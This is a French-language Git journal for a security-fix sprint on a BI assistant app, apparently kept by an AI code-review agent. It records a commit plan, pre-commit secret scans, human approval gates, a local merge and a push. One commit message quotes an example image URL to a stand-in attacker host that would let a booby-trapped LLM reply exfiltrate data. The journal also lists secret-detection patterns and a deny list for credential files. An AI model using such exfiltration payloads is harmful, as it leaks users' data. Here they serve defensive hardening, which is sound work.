# Journal Git — Sprint `2026-11-10-securite-p0`

- **Responsable** : Code Reviewer & Git · **Tâche orchestrateur** : #6
- **Type de sprint** : bug / sécurité (correctifs P0), voir `architecture.md`

## 1. Branche de sprint

| Élément | Valeur |
|---|---|
| Branche | `fix/2026-11-10-securite-p0` (locale uniquement, non poussée) |
| Base | `main` @ `b6dd547` (« BI Advisor : version initiale ») |
| Date de création | 2026-11-10 |
| Commande | `git switch -c fix/2026-11-10-securite-p0` |
| Validation humaine | « OK » explicite donné dans la conversation pour cette seule action |

### Contrôles préalables (sous-étape 2.1)

- Branche courante avant l'opération : `main` ✅
- `HEAD` = `b6dd547` ✅
- Modifications suivies en cours : aucune (`git status --porcelain --untracked-files=no` vide) ✅

### Vérification (sous-étape 2.2)

- `git branch --show-current` → `fix/2026-11-10-securite-p0` ✅
- `git rev-parse --short HEAD` → `b6dd547` ✅

## 2. État de l'arbre de travail à la création

Aucun fichier indexé, aucune modification de fichier suivi. Fichiers **non suivis, non indexés** (laissés en l'état) :

| Chemin | Statut | Remarque |
|---|---|---|
| `.claude/` | non suivi, non indexé | configuration des agents ; à arbitrer avant le commit final |
| `.omc/` | non suivi, non indexé | état local OMC : **ne jamais commiter** (à vérifier dans `.gitignore`) |
| `AGENTS_README.md` | non suivi, non indexé | documentation du workflow |
| `CLAUDE.md` | non suivi, non indexé | gouvernance du dépôt |
| `docs/` | non suivi, non indexé | audits, livrables de sprint (dont ce fichier) |

## 3. Commits

Aucun commit dans la tâche #6. Les 10 commits du plan § 6 ont été créés par la tâche orchestrateur #10, voir le § 7.

## 4. Contrôles de secrets

Exécutés avant chaque commit sur `git diff --cached`, voir le § 7.3.

## 5. Push / merge / PR

GATE 3 franchie le 2026-11-11 : commit + merge local dans `main`, sans push ni PR (aucun remote à ce moment-là), voir le § 8.
Publication le 2026-11-11 : remote `origin` ajouté, `main` poussé et suivi (`origin/main`), branche de sprint supprimée en local, aucune PR, voir le § 9.

## 6. Plan de commits proposé (tâche orchestrateur #27) — EXÉCUTÉ tel quel (tâche #10, validation humaine « OK, plan tel quel »), voir § 7

Préparé après la revue courte BUG-1 « Approuvé » (`code-review.md`, dernière section), le QA GO conditionnel et la validation PO « Accepté sous réserve ». **Aucune commande Git d'écriture n'a été exécutée.** Aucun fichier n'est indexé et `.gitignore` n'a pas été modifié.

### 6.1 Inventaire de l'arbre de travail (`git status --porcelain -uall`, 2026-11-10)

| Classement | Fichiers | Décision |
|---|---|---|
| **À commiter** : 16 fichiers suivis modifiés | `.env.example`, `README.md`, `next.config.mjs`, `package.json`, `package-lock.json`, `src/app/api/llm/chat/route.ts`, `src/app/api/llm/test/route.ts`, `src/components/chat/MessageBubble.tsx`, `src/components/connectors/ConnectorsModal.tsx`, `src/components/report/ReportModal.tsx`, `src/server/connectors/{index,mongo,odoo,saas,sql}.ts`, `src/server/llm.ts` | commits 2 à 7 |
| **À commiter** : 30 fichiers nouveaux | `src/lib/markdown-safety.ts`, `src/components/ui/SafeMarkdown.tsx`, `src/server/net/{policy,safe-fetch}.ts`, `src/server/connectors/{sql-guard,sqlite-path}.ts`, `vitest.config.ts`, `tests/unit/*` (6), `docs/audits/2026-11-10-audit-global.md`, `docs/sprints/2026-11-10-securite-p0/*.md` (7), `.claude/agents/*.md` (6), `.claude/settings.json`, `CLAUDE.md`, `AGENTS_README.md` | commits 2 à 10 |
| **À ignorer** (`.gitignore`, commit 1) | `.omc/` (8 fichiers d'état OMC), `.vitest/json/output.json` (sortie de l'enveloppe de test) | jamais indexés ; pas de suppression (`rm` soumis à validation, inutile une fois ignorés) |
| **Exclus, déjà ignorés** | `data/`, `.env`, `.env.local`, `.next/`, `node_modules/`, `*.tsbuildinfo` | `git check-ignore -v` : couverts par `.gitignore` l. 1-7. Aucun n'apparaît dans `git status`. Ni lus ni indexés |

**Contrôle de secrets** (sur les 46 fichiers candidats, `package-lock.json` exclu) : motifs `sk-…`, `AIza…`, `nvapi-…`, `password=`, `BEGIN … PRIVATE KEY`, `<schéma>://user:pass@`, `ghp_`, `xox[bp]-`, `secret_…`, `ntn_…`. Résultat : **aucun secret réel**. Les 6 occurrences trouvées sont des exemples factices :
- `postgres://u:p@127.0.0.1/d` dans `tests/unit/safe-fetch.test.ts:281`, `architecture.md:256` et `qa-report.md:105` ;
- `mongodb://user:pw@h.exemple.com` dans `tests/unit/policy.test.ts:186` ;
- le placeholder préexistant `mongodb+srv://user:pass@cluster/…` dans `ConnectorsModal.tsx:119` ;
- la liste des motifs elle-même, dans `.claude/agents/reviewer.md:61`.

Le même contrôle sera rejoué sur `git diff --cached` avant chaque commit.

**Hygiène** : 0 `TODO` / `FIXME` / `console.log` / `.only(` / `.skip(` dans les sources et les tests du sprint.

### 6.2 Points de vigilance

1. **`package.json`** : seuls 2 ajouts sont fonctionnels, le script `"test": "vitest run"` et la devDependency `vitest ^5.1.0`. Le déplacement de `@types/better-sqlite3` et `@types/mssql` est un **tri alphabétique fait par npm**, sans changement de version. Ce n'est pas une modification de dépendance.
2. **`package-lock.json`** (+985 / −31 lignes) : la comparaison sémantique avec `HEAD` donne **49 paquets ajoutés** (arbre de Vitest), **0 supprimé**, **0 changement de version**, **0 changement du drapeau `dev`**. Les 31 lignes « supprimées » viennent du réalignement textuel du diff. `npm audit` signale 7 vulnérabilités, non analysées et hors périmètre (dette signalée par le QA).
3. **Fichiers qui mêlent plusieurs stories** : `git add -p` est interdit (mode non interactif), donc on ne peut pas découper un fichier entre plusieurs commits. Le découpage retenu :
   - `sql.ts` (US-2 T-5, US-3 T-11, US-4 T-14/T-15), `index.ts` (T-12, qui importe `sqlite-path` et `sql-guard`) et `ConnectorsModal.tsx` (micro-copies US-2 T-5 et US-4 T-16) vont **ensemble dans le commit 5**, avec `sql-guard.ts` et `sqlite-path.ts`. US-2 et US-4 partagent donc ce commit, et la partie SQL d'US-3 y figure aussi. C'est indiqué dans le message.
   - `README.md` et `.env.example` couvrent US-2, US-3 et US-4 (T-16, T-17). Ils forment un commit de documentation commun (commit 7).
   - `saas.ts` et `odoo.ts` portent US-3 et le correctif BUG-1. Ils vont dans le commit 4, qui cite `BUG-1`. La partie BUG-1 de `sql.ts` est couverte par le commit 5.
4. **Compilabilité de chaque commit** (vérifiée par analyse des imports, sans exécution intermédiaire) :
   - le commit 2 n'utilise que `react-markdown` et `remark-gfm`, déjà présents ;
   - le commit 4 est autonome (`llm.ts` → `net/safe-fetch` → `net/policy`), et `index.ts` reste à sa version `HEAD`, qui compile ;
   - le commit 5 dépend du 4 (`sql.ts` → `net/policy`) ;
   - les tests (commit 6) n'arrivent qu'après tout le code qu'ils importent, avec `vitest` dans `package.json`.
5. **Fins de ligne** : `core.autocrlf=true`. Les avertissements « LF will be replaced by CRLF » sont attendus et n'ont aucun impact sur le contenu indexé (stocké en LF).
6. **`.claude/settings.json`** : **à commiter**. C'est une configuration d'équipe partagée sans secret ni chemin local : la variable `CLAUDE_CODE_ENABLE_TODO_TOOLS=1`, la liste `ask` (confirmation Git, `rm`, npm, vercel) et la liste `deny` (lecture de `data/auth-secret`, `data/users.json`, `.env`, `.env.local`). Elle matérialise les garde-fous du `CLAUDE.md` § 5. À ne **pas** commiter : un éventuel `.claude/settings.local.json` (préférences personnelles, absent aujourd'hui), d'où la ligne préventive proposée au § 6.3.
7. **`git-log.md` se référence lui-même** : il est commité en dernier (commit 10). Avant de l'indexer, on y reporte les hashes des commits 1 à 9. Le hash du commit 10 sera consigné dans l'arbre de travail après coup, sans nouveau commit (`git log` fait foi).
8. **Build** : `npm run build` n'a pas été relancé depuis BUG-1, une correction de 3 littéraux couverte par `tsc` et par les 575 tests. On le rejoue en **étape 0**, avant le premier commit. Un échec arrête l'exécution.

### 6.3 Ajout proposé à `.gitignore` (commit 1)

On ajoute ces lignes à la fin du fichier, sans modifier les lignes existantes :

```gitignore

# État local des outils (orchestration OMC, sortie Vitest, préférences Claude personnelles)
.omc/
.vitest/
.claude/settings.local.json
```

Contrôle attendu après l'ajout : `git status --porcelain -uall` ne liste plus aucun fichier `.omc/` ni `.vitest/`.

### 6.4 Commits, dans l'ordre

Procédure pour chaque commit :
1. `git add -- <chemins exacts>` (jamais `-A` ni `.`) ;
2. `git diff --cached --stat`, pour vérifier que la liste correspond exactement ;
3. recherche de motifs de secrets dans `git diff --cached` ;
4. `git commit -F <fichier de message>` (jamais `--no-verify`). Le message ci-dessous est écrit tel quel dans un fichier du scratchpad de session, ce qui évite les problèmes de guillemets du shell.

---

**Étape 0 (lecture seule)** : `npm run build` → doit sortir avec le code 0.

---

**Commit 1** · `chore(config): ignorer l'état local OMC et la sortie Vitest`
Fichiers : `.gitignore`

```
chore(config): ignorer l'état local OMC et la sortie Vitest

Les dossiers .omc/ (état d'orchestration) et .vitest/ (rapport JSON généré
à chaque exécution des tests) sont propres au poste et ne doivent jamais
entrer dans le dépôt. settings.local.json (préférences Claude personnelles)
est ignoré par prévention ; settings.json, partagé, reste versionné.

Réf : sprint 2026-11-10-securite-p0 (qa-report.md § 6)

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 2** · `fix(chat): neutraliser images et liens dangereux du Markdown LLM`
Fichiers : `src/lib/markdown-safety.ts`, `src/components/ui/SafeMarkdown.tsx`, `src/components/chat/MessageBubble.tsx`, `src/components/report/ReportModal.tsx`

```
fix(chat): neutraliser images et liens dangereux du Markdown LLM

Une réponse LLM piégée pouvait exfiltrer des données par une image distante
(![x](https://attaquant/?d=…)) chargée automatiquement dans le chat ou le
rapport exécutif, ou proposer des liens javascript:/data:/http:. Un composant
unique SafeMarkdown remplace les deux rendus : aucune image (marqueur
« Image non affichée (protection des données) »), liens limités à https,
mailto et ancres, rel="noopener noreferrer nofollow", HTML brut ignoré.

Réf : US-1, T-1, T-2 (C1, ADR-C1-01)

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 3** · `fix(config): restreindre img-src par une CSP`
Fichiers : `next.config.mjs`

```
fix(config): restreindre img-src par une CSP

Défense en profondeur de US-1 : même hors Markdown, aucune image ne peut
être chargée depuis une origine tierce. La CSP est volontairement limitée à
img-src 'self' data: blob: pour ne casser ni le script inline du layout,
ni Google Fonts, ni Google Identity Services.

Réf : US-5, T-3 (S9 partiel, ADR-S9-01)

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 4** · `fix(connecteurs): bloquer les requêtes serveur vers les destinations internes`
Fichiers : `src/server/net/policy.ts`, `src/server/net/safe-fetch.ts`, `src/server/connectors/saas.ts`, `src/server/connectors/odoo.ts`, `src/server/connectors/mongo.ts`, `src/server/llm.ts`, `src/app/api/llm/chat/route.ts`, `src/app/api/llm/test/route.ts`

```
fix(connecteurs): bloquer les requêtes serveur vers les destinations internes

Les URL saisies (API REST, Airtable, Notion, Odoo, URL de base LLM, URI
MongoDB) permettaient d'atteindre le réseau interne et les métadonnées
cloud depuis le serveur (SSRF). Une politique réseau commune (public ou
allowlist via BI_NETWORK_POLICY / BI_ALLOWED_HOSTS) filtre chaque
destination ; safeFetch épingle l'IP résolue (anti DNS-rebinding), refuse
redirections, identifiants dans l'URL et en-têtes de détournement, plafonne
la taille et le délai, et n'expose plus le corps des erreurs. L'URL de base
LLM n'est acceptée que pour les fournisseurs qui la prennent en charge.
Messages « JSON non valide » de saas.ts et odoo.ts alignés sur l'apostrophe
droite (BUG-1).

Réf : US-3, T-6, T-7, T-8, T-9, T-10, T-11 (Mongo) ; BUG-1 ; CR : voir code-review.md (itérations 1 à 4)

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 5** · `fix(connecteurs): confiner SQLite et imposer une lecture seule bornée en SQL`
Fichiers : `src/server/connectors/sql-guard.ts`, `src/server/connectors/sqlite-path.ts`, `src/server/connectors/sql.ts`, `src/server/connectors/index.ts`, `src/components/connectors/ConnectorsModal.tsx`

```
fix(connecteurs): confiner SQLite et imposer une lecture seule bornée en SQL

Regroupe US-2, US-4 et la partie SQL d'US-3, mêlées dans sql.ts, index.ts
et ConnectorsModal.tsx (découpage par hunk impossible en mode non
interactif).
- SQLite : le chemin est résolu dans BI_SQLITE_DIR uniquement (désactivé
  sinon), liens et jonctions sortants refusés, aucun accès disque avant
  contrôle, data/ jamais atteignable.
- Lecture seule : sql-guard n'accepte qu'une instruction SELECT par analyse
  lexicale par dialecte (mots-clés et fonctions d'écriture, caractères de
  contrôle, parenthèses déséquilibrées), puis transaction READ ONLY, délai
  de 30 s et plafond de 1000 lignes côté SGBD ; LOCAL INFILE refusé.
- Hôtes SQL filtrés par la politique réseau, chaînes de connexion refusées
  (E-SQL-7, apostrophe droite : BUG-1), routage TDS et SQL Browser
  contrôlés.
- friendly() renvoie les messages des gardes sans détail sensible.
- Micro-copies : fichier SQLite relatif au dossier autorisé, compte en
  lecture seule obligatoire.

Réf : US-2, US-3, US-4, T-4, T-5, T-11, T-12, T-13, T-14, T-15, T-16 ; BUG-1 ; CR-1 à CR-17

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 6** · `test(securite): ajouter Vitest et couvrir les gardes du sprint`
Fichiers : `package.json`, `package-lock.json`, `vitest.config.ts`, `tests/unit/markdown-safety.test.tsx`, `tests/unit/policy.test.ts`, `tests/unit/safe-fetch.test.ts`, `tests/unit/sql-fake-servers.test.ts`, `tests/unit/sql-guard.test.ts`, `tests/unit/sqlite-path.test.ts`

```
test(securite): ajouter Vitest et couvrir les gardes du sprint

Premier framework de test du projet (npm test = vitest run). 575 tests :
rendu SafeMarkdown, politique réseau et safeFetch avec serveurs témoins,
garde lecture seule (refus, faux positifs, contrôles), confinement SQLite
(jonction réelle), faux serveurs MySQL / TDS / SQL Browser. Dans
package.json, seuls le script test et la devDependency vitest sont
fonctionnels : le déplacement des @types/* est un tri alphabétique de npm,
sans changement de version. Le lockfile n'ajoute que l'arbre de Vitest
(49 paquets, aucune version modifiée).

Réf : US-1, US-2, US-3, US-4 ; BUG-1 (tests rendus stricts)

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 7** · `docs(config): documenter la politique réseau, SQLite et le compte lecture seule`
Fichiers : `README.md`, `.env.example`

```
docs(config): documenter la politique réseau, SQLite et le compte lecture seule

Les nouvelles variables (BI_NETWORK_POLICY, BI_ALLOWED_HOSTS,
BI_SQLITE_DIR) et les changements cassants doivent être connus des
administrateurs avant la mise à jour : SQLite désactivé par défaut,
adresses internes refusées sauf liste blanche, chaînes de connexion SQL
refusées. Le compte SGBD en lecture seule devient obligatoire (exemples
PostgreSQL, MySQL, SQL Server), car c'est la seule garantie réelle.

Réf : US-2, US-3, US-4, T-16, T-17

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 8** · `chore(gouvernance): versionner le workflow multi-agents Claude Code`
Fichiers : `CLAUDE.md`, `AGENTS_README.md`, `.claude/settings.json`, `.claude/agents/po.md`, `.claude/agents/tech-lead.md`, `.claude/agents/ux-ui.md`, `.claude/agents/dev.md`, `.claude/agents/reviewer.md`, `.claude/agents/qa.md`

```
chore(gouvernance): versionner le workflow multi-agents Claude Code

Partage avec l'équipe le workflow à 6 agents (PO, Tech Lead, UX/UI, Dev,
Reviewer & Git, QA), ses gates humaines et ses invariants de sécurité.
settings.json impose une confirmation pour les commandes Git, npm, rm et
vercel, et interdit la lecture de data/ et .env* ; il ne contient aucun
secret ni chemin local.

Réf : sprint 2026-11-10-securite-p0 (gouvernance)

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 9** · `docs(audit): ajouter l'audit global du 2026-11-10`
Fichiers : `docs/audits/2026-11-10-audit-global.md`

```
docs(audit): ajouter l'audit global du 2026-11-10

L'audit est à l'origine des correctifs P0 du sprint (C1, S1, S2, S3, S9).
Il reste la référence pour les sprints de sécurité suivants.

Réf : US-1, US-2, US-3, US-4, US-5

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

---

**Commit 10** · `docs(sprint): livrables du sprint 2026-11-10-securite-p0`
Fichiers : `docs/sprints/2026-11-10-securite-p0/architecture.md`, `code-review.md`, `dev-notes.md`, `git-log.md`, `qa-report.md`, `test-plan.md`, `validation-po.md`
Pré-requis : avant le `git add`, reporter dans `git-log.md` (nouveau § 7) les hashes des commits 1 à 9 et le résultat de l'étape 0.

```
docs(sprint): livrables du sprint 2026-11-10-securite-p0

Trace complète du sprint de correctifs P0 : conception et Gherkin
(GATE 2), 4 itérations de revue plus la revue courte BUG-1, recette QA
(GO conditionnel, dette ⏳ à rejouer sur de vrais SGBD et dans un
navigateur authentifié avant la mise en production), validation PO
(acceptée sous réserve) et journal Git.

Réf : US-1, US-2, US-3, US-4, US-5, T-1 à T-17 ; BUG-1 ; CR-1 à CR-17

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
```

### 6.5 Contrôle final attendu

- `git status --porcelain -uall` : vide, à l'exception éventuelle de `git-log.md` (hash du commit 10 reporté après coup).
- `git log --oneline main..HEAD` : 10 commits.
- Aucun push, merge ni PR : ces actions relèvent de la **GATE 3**, avec une validation séparée.

## 7. Exécution du plan (tâche orchestrateur #10, 2026-11-10)

- **Validation humaine** : « OK, plan tel quel », donné pour cette action précise (modification de `.gitignore` et les 10 commits du plan). Elle ne couvre ni push, ni merge, ni PR, ni tag, ni rebase, ni reset, ni amend.
- **Branche** : `fix/2026-11-10-securite-p0`, base `b6dd547`. Locale uniquement, **non poussée**.
- **Méthode** : `git add -- <chemins exacts>` puis `git commit -F <message du scratchpad>`, jamais `-A`, `.` ou `--no-verify`. Aucun hook n'a échoué.

### 7.1 Étape 0 : `npm run build`

Code de sortie **0** (Next.js 15.5.29) : compilation réussie, types valides, 9 pages statiques générées, 16 routes.

### 7.2 Commits créés

| # | Hash | Message | Fichiers |
|---|---|---|---|
| 1 | `be5b70c` | chore(config): ignorer l'état local OMC et la sortie Vitest | 1 (`.gitignore`, +5) |
| 2 | `5a07da2` | fix(chat): neutraliser images et liens dangereux du Markdown LLM | 4 (+97 / −18) |
| 3 | `ef8c33f` | fix(config): restreindre img-src par une CSP | 1 (`next.config.mjs`, +4) |
| 4 | `792d358` | fix(connecteurs): bloquer les requêtes serveur vers les destinations internes | 8 (+484 / −34) |
| 5 | `552b6cc` | fix(connecteurs): confiner SQLite et imposer une lecture seule bornée en SQL | 5 (+521 / −50) |
| 6 | `3f4fba4` | test(securite): ajouter Vitest et couvrir les gardes du sprint | 9 (+2378 / −34) |
| 7 | `093f5e5` | docs(config): documenter la politique réseau, SQLite et le compte lecture seule | 2 (+65 / −4) |
| 8 | `c4adae1` | chore(gouvernance): versionner le workflow multi-agents Claude Code | 9 (+1000) |
| 9 | `949f170` | docs(audit): ajouter l'audit global du 2026-11-10 | 1 (+162) |
| 10 | `ad14cfc` (reporté après coup) | docs(sprint): livrables du sprint 2026-11-10-securite-p0 | 7 (ce fichier inclus) |

Chaque commit se termine par `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`. Ce fichier est inclus dans le commit 10, dont il ne peut pas contenir le hash : `git log` fait foi.

### 7.3 Contrôles avant chaque commit

- **Liste indexée** : `git diff --cached --name-only` comparée au nombre de fichiers attendu. Conforme pour les 10 commits, aucun fichier en trop.
- **Fichiers interdits** : aucun fichier `data/`, `.env`, `.env.local`, `.omc/`, `.vitest/`, `.next/`, `node_modules/` ou `*.tsbuildinfo` indexé. `.env.example` (commit 7) ne contient que des commentaires et des variables commentées.
- **Motifs de secrets**, dans les lignes ajoutées : aucun secret réel. Les seules occurrences sont des valeurs factices :
  - commit 6, dans `tests/unit/` : `mongodb://user:pw@h.exemple.com`, `https://user:pass@api.exemple.com/x` (2 cas de refus testés) et `postgres://u:p@127.0.0.1/d` ;
  - commit 8 : la liste des motifs dans `.claude/agents/reviewer.md`.
- **Lockfile** (commit 6) : aucune URL avec identifiants ni jeton ; toutes les sources `resolved` ajoutées pointent vers `registry.npmjs.org`.
- **`.claude/settings.json`** (commit 8) : aucun chemin local ni secret.

### 7.4 État final

- `git status --porcelain -uall` après le commit 10 : **vide**. `.omc/` et `.vitest/` sont désormais ignorés. Seul ce fichier est ensuite modifié dans l'arbre de travail, pour le hash `ad14cfc`, sans nouveau commit (§ 6.5).
- `git rev-list --count main..HEAD` : **10**. Aucun fichier interdit suivi (`git ls-files`).
- Sortie de `git log --oneline -11` :

```
ad14cfc docs(sprint): livrables du sprint 2026-11-10-securite-p0
949f170 docs(audit): ajouter l'audit global du 2026-11-10
c4adae1 chore(gouvernance): versionner le workflow multi-agents Claude Code
093f5e5 docs(config): documenter la politique réseau, SQLite et le compte lecture seule
3f4fba4 test(securite): ajouter Vitest et couvrir les gardes du sprint
552b6cc fix(connecteurs): confiner SQLite et imposer une lecture seule bornée en SQL
792d358 fix(connecteurs): bloquer les requêtes serveur vers les destinations internes
ef8c33f fix(config): restreindre img-src par une CSP
5a07da2 fix(chat): neutraliser images et liens dangereux du Markdown LLM
be5b70c chore(config): ignorer l'état local OMC et la sortie Vitest
b6dd547 BI Advisor : version initiale
```

- Push, merge et PR : **aucun**, en attente de la GATE 3.

## 8. GATE 3 (2026-11-11)

- **Décision humaine** : « Commit + merge local ». Validation explicite donnée dans la conversation pour ces deux actions précises.
- **Remote** : aucun n'est configuré (`git remote -v` vide). Il n'y a donc **ni push ni PR**. Aucun tag, et la branche `fix/2026-11-10-securite-p0` n'est pas supprimée.
- **Contrôles préalables** : seul ce fichier était modifié dans l'arbre de travail (complément du § 7 : hash `ad14cfc`, sortie `git log`). Aucun fichier interdit, aucun motif de secret dans le diff.
- **Commit 11** sur la branche : `docs(sprint): consigner la GATE 3 du sprint securite-p0`. Il ne contient que ce fichier.
- **Merge** : `git checkout main` puis `git merge --no-ff fix/2026-11-10-securite-p0`, avec le message « Merge branch 'fix/2026-11-10-securite-p0' : sprint sécurité P0 ». Au départ, `main` était au point de bifurcation `b6dd547`, donc aucun conflit n'était possible.
- Ce fichier est figé avant le merge, si bien que les hashs du commit 11 et du commit de merge n'y figurent pas : `git log --oneline --graph` sur `main` fait foi.

## 9. Publication (2026-11-11)

- **Exécutant** : l'humain lui-même, dans le terminal (préfixe `!`). Le système de permissions de Claude Code avait refusé `git remote add` au reviewer (motif « Remote Repoint ») ; ce refus n'a pas été contourné.
- **Commandes et résultats** :

| # | Commande | Résultat |
|---|---|---|
| 1 | `git remote add origin https://github.com/TokyPro/Bi-Advisorgeneric.git` | remote `origin` configuré |
| 2 | `git push -u origin main` | « * [new branch] main -> main » ; `main` suit `origin/main` |
| 3 | `git branch -d fix/2026-11-10-securite-p0` | « Deleted branch fix/2026-11-10-securite-p0 (was 7ab3140) » (suppression sûre, branche déjà fusionnée) |

- **Hashs** : commit 11 (GATE 3) `7ab3140` ; merge `--no-ff` `d130a22` sur `main`. Ce sont les hashs publiés sur `origin/main`.
- **Non réalisé** : aucune PR (le sprint était déjà fusionné localement), aucun tag, aucun `--force`, aucun `--no-verify`. La branche `fix/2026-11-10-securite-p0` n'a jamais été poussée.
- **Mise à jour de ce fichier** : commit `docs(sprint): consigner la publication du sprint securite-p0` directement sur `main`, puis `git push origin main`, sur validation humaine explicite (« Fais le nécessaire »). Ce fichier ne peut pas contenir le hash de ce commit : `git log` fait foi.
